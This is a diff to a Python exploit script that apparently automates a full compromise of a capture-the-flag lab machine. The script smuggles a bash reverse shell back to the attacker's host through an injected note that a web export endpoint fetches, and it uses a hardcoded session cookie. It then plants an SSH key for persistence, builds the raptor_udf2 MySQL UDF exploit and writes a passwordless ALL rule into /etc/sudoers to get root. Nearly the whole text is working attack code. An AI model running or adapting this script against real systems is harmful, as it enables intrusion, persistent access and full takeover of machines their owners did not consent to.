@@ -16,12 +16,13 @@ if len(sys.argv) < 2:
     print(f"[\033[1;31m-\033[1;37m] Uso: python3 {sys.argv[0]} <ip>\n")
     exit(1)
 
-ip = sys.argv[1]
+rsa = "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\nQyNTUxOQAAACCgRQfFbAT+ymCP/M1mw5YsrwOmqGkq6CS0XpVjT1iZhAAAAJA2yx0UNssd\nFAAAAAtzc2gtZWQyNTUxOQAAACCgRQfFbAT+ymCP/M1mw5YsrwOmqGkq6CS0XpVjT1iZhA\nAAAEDD/e9ME3S+VU3cvG/CwHOodb4Un8u/+ucnd0GCccAOkaBFB8VsBP7KYI/8zWbDliyv\nA6aoaSroJLRelWNPWJmEAAAAC3Jvb3RAcGFycm90AQI=\n-----END OPENSSH PRIVATE KEY-----"
+md = f"--';bash -i >& /dev/tcp/{sys.argv[1]}/443 0>&1;'--"
 
-rsa = ("-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAArAAAABNlY2RzYS\n1zaGEyLW5pc3RwNTIxAAAACG5pc3RwNTIxAAAAhQQAV+el7yuxnYFf7OIrTmrtkcCc+SIX\nB2Kx57Iy7C6tqnRt9a75XTAg+BMLS2bBVu5GOfUJmzb1MdGwS3qXjng8P2EA3x5Wbk3QKX\n53brevFwG7DTCJ+Y4w+rO7LGcUx26pNS0IOTPTlOiIAmW55vDm1X0XRVR1yQkZKAuY6JyE\nMyaO5JcAAAEQabjlkWm45ZEAAAATZWNkc2Etc2hhMi1uaXN0cDUyMQAAAAhuaXN0cDUyMQ\nAAAIUEAFfnpe8rsZ2BX+ziK05q7ZHAnPkiFwdiseeyMuwurap0bfWu+V0wIPgTC0tmwVbu\nRjn1CZs29THRsEt6l454PD9hAN8eVm5N0Cl+d263rxcBuw0wifmOMPqzuyxnFMduqTUtCD\nkz05ToiAJluebw5tV9F0VUdckJGSgLmOichDMmjuSXAAAAQgDqFgsGASYZOcTRf2U760nc\nmu4YpvT7/Q0vKEuz9l70jUalAI/F9nf08dpXjE/2/BiUNKXDvaVYUW1eFaIBu3W4aAAAAB\nJFQ0RTQSA1MjEgYml0IEtleXM=\n-----END OPENSSH PRIVATE KEY-----")
-md = ("--';bash -i >& /dev/tcp/%s/443 0>&1;'--" % (ip))
-os.system('echo "%s" > key' % (rsa))
-os.system('echo "%s" > note.md' % (md))
+with open('key', 'w') as f:
+    f.write(rsa)
+with open('note.md', 'w') as f:
+    f.write(md)
 
 def serr():
     os.system("python3 -m http.server 6000")
@@ -31,18 +32,16 @@ def cmd():
     target = "http://10.10.11.160:5000/export_note_remote"
     data = "url=http://"
     note = ":6000/note.md"
-    headers = {"Content-Type": "application/x-www-form-urlencoded", "Cookie": "session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.Yqe56g.SYM1NcZo1P6yn4Fxrgua6KSqzQc", "Origin": "http://10.10.11.160:5000", "Referer": "http://10.10.11.160:5000/export_note", "Cache-Control": "max-age=0"}
-    requests.post(target, data=data + ip + note, headers=headers, verify=False)
+    headers = {"Content-Type": "application/x-www-form-urlencoded", "Cookie": "session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.Yt3RAw.WEmtfGhrymx9PMK0Ir7eS7Q55Rk"}
+    requests.post(target, data=data + sys.argv[1] + note, headers=headers, verify=False)
 
 threading.Thread(target=serr, args=()).start()
 threading.Thread(target=cmd, args=()).start()
 shell = listen(443, timeout=30).wait_for_connection()
 time.sleep(0.5)
-shell.sendline(b"mkdir ~/.ssh;echo 'ecdsa-sha2-nistp521 AAAAE2VjZHNhLXNoYTItbmlzdHA1MjEAAAAIbmlzdHA1MjEAAACFBABX56XvK7GdgV/s4itOau2RwJz5IhcHYrHnsjLsLq2qdG31rvldMCD4EwtLZsFW7kY59QmbNvUx0bBLepeOeDw/YQDfHlZuTdApfndut68XAbsNMIn5jjD6s7ssZxTHbqk1LQg5M9OU6IgCZbnm8ObVfRdFVHXJCRkoC5jonIQzJo7klw== ECDSA 521 bit Keys' > ~/.ssh/authorized_keys")
-
+shell.sendline(b"mkdir ~/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKBFB8VsBP7KYI/8zWbDliyvA6aoaSroJLRelWNPWJmE root@parrot' > ~/.ssh/authorized_keys")
 wget("https://raw.githubusercontent.com/1N3/PrivEsc/master/mysql/raptor_udf2.c", "raptor_udf2.c")
-os.system("gcc -g -c raptor_udf2.c")
-os.system("gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc")
+os.system("gcc -g -c raptor_udf2.c; gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc")
 
 request = ssh(host='10.10.11.160', user='svc', keyfile='key')
 shell = request.process("/bin/sh")
@@ -57,7 +56,7 @@ shell.sendline(b"select * from mysql.func;")
 shell.sendline(b'''select do_system('echo "ALL ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers');''')
 shell.sendline(b"exit")
 shell.sendline(b"sudo sh")
-time.sleep(0.5)
+shell.recvuntil(b"#")
 shell.sendline(b"export HOME=/; bash")
-shell.sendline(b"export HOME=/root; cd; echo $(id)")
+shell.sendline(b"export HOME=/root; cd; clear")
 shell.interactive()
